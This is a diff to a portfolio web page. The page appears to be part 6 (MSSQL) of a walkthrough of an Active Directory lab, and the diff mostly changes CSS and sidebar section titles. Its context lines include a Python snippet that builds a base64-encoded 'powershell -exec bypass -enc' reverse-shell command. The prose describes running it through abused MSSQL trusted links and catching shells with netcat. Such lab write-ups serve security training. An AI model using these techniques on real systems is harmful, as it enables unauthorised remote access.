@@ -12,6 +12,22 @@
   <style>
     .goad-sidebar { padding: 20px; }
     .goad-sidebar h3 { color: #ffdb70; margin-bottom: 15px; font-size: 1.1rem; }
+    .goad-sidebar .portfolio-link { 
+      display: block; 
+      padding: 10px 12px; 
+      margin-bottom: 15px; 
+      color: #ffdb70; 
+      text-decoration: none; 
+      border-radius: 6px; 
+      font-size: 0.9rem; 
+      font-weight: 600;
+      background: #2a2a2a;
+      transition: all 0.2s;
+    }
+    .goad-sidebar .portfolio-link:hover { 
+      background: #ffdb70; 
+      color: #1a1a1a; 
+    }
     .goad-sidebar a { display: block; padding: 8px 12px; margin: 4px 0; color: #d6d6d6; text-decoration: none; border-radius: 6px; font-size: 0.9rem; transition: all 0.2s; }
     .goad-sidebar a:hover { background: #2a2a2a; color: #ffdb70; }
     .goad-sidebar a.active { background: #ffdb70; color: #1a1a1a; font-weight: 600; }
@@ -33,6 +49,8 @@
     .notion-content em { font-style: italic; }
     .notion-content figure { margin: 20px 0; }
     .notion-content figcaption { display: none; }
+    .main-content { max-width: 100% !important; }
+    .about { max-width: 100% !important; padding: 20px 40px !important; }
   </style>
 </head>
 <body>
@@ -54,20 +72,21 @@
       <div class="sidebar-info_more">
         <div class="separator"></div>
         <div class="goad-sidebar">
+          <a href="../" class="portfolio-link">← Portfolio</a>
           <h3>Sections</h3>
           <a href="overview.html" class="">Overview</a>
-          <a href="part-01.html" class="">Part 1</a>
-          <a href="part-02.html" class="">Part 2</a>
-          <a href="part-03.html" class="">Part 3</a>
-          <a href="part-04.html" class="">Part 4</a>
-          <a href="part-05.html" class="">Part 5</a>
-          <a href="part-06.html" class="active">Part 6</a>
-          <a href="part-07.html" class="">Part 7</a>
-          <a href="part-08.html" class="">Part 8</a>
-          <a href="part-09.html" class="">Part 9</a>
-          <a href="part-10.html" class="">Part 10</a>
-          <a href="part-11.html" class="">Part 11</a>
-          <a href="part-12.html" class="">Part 12</a>
+          <a href="part-01.html" class="">Part 1 – Reconnaissance and Scan</a>
+          <a href="part-02.html" class="">Part 2 – Finding Users</a>
+          <a href="part-03.html" class="">Part 3 – Authenticated Enumeration</a>
+          <a href="part-04.html" class="">Part 4 – Network Poisoning and NTLM Relaying</a>
+          <a href="part-05.html" class="">Part 5 – ADCS - ESC1 - ESC16</a>
+          <a href="part-06.html" class="active">Part 6 – MSSQL</a>
+          <a href="part-07.html" class="">Part 7 – Privilege Escalation</a>
+          <a href="part-08.html" class="">Part 8 – Lateral Movement</a>
+          <a href="part-09.html" class="">Part 9 – Delegations</a>
+          <a href="part-10.html" class="">Part 10 – ACL</a>
+          <a href="part-11.html" class="">Part 11 – Abusing Trusts</a>
+          <a href="part-12.html" class="">Part 12 – Having Fun</a>
         </div>
         <div class="separator"></div>
         <ul class="contacts-list">
@@ -172,9 +191,7 @@ byte = payload.encode(&#x27;utf-16-le&#x27;)
 b64 = base64.b64encode(byte)
 print(&quot;powershell -exec bypass -enc %s&quot; % b64.decode())</code></pre></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-80c5-b63c-c311e7ee2c2b" class="">
 </p></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-80f3-8c0f-dfe49d2283af" class="">Let’s convert how powershell payload to base64 using local IP and local port listening for the connection.</p></div><div style="display:contents" dir="ltr"><figure id="30c79e9a-d7c9-8064-8088-f4922194b677" class="image"><a href="images/image-308.png"><img style="width:2552px" src="images/image-308.png"/></a></figure></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-80ed-b27b-e9e55f75299e" class="">After that we just have to execute this command into our MSSQL server since we have abused trusted links.</p></div><div style="display:contents" dir="ltr"><figure id="30c79e9a-d7c9-807c-835f-ff14d9a4eee2" class="image"><a href="images/image-309.png"><img style="width:2545px" src="images/image-309.png"/></a></figure></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-8090-a640-c97cb90acd99" class="">Listening on NetCat  in port 8080 as stated when converting the powershell payload to base64, We are able to get reverse shell from Castelback MSSQL and from BRAAVOS MSSQL server as well.</p></div><div style="display:contents" dir="ltr"><figure id="30c79e9a-d7c9-80d8-a439-cd285d725eac" class="image"><a href="images/image-310.png"><img style="width:2553px" src="images/image-310.png"/></a></figure></div></details></li></ul></div><div style="display:contents" dir="auto"><ul id="30c79e9a-d7c9-805e-9611-da314f073036" class="toggle"><li><details open="">
-        </section>
-        <div class="page-nav"><a href="part-05.html" class="nav-btn">← Previous</a><a href="part-07.html" class="nav-btn">Next →</a></div>
-      </article>
+        </section></article>
     </div>
   </main>
 
